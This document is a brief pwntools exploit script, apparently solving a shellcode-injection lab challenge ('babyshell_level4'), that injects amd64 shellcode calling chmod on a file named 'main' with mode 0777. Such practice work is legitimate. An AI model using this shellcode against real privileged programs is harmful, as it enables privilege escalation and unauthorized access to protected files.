from pwn import *
context.binary = "/challenge/babyshell_level4"
context.arch = "amd64"
p = process()
payload = asm(
"""
push 0x6e69616d
push rsp
pop rdi
xor esi, esi
mov esi, 0x1ff
mov al, 0x5a
syscall
"""
)
p.sendline(payload)
p.interactive()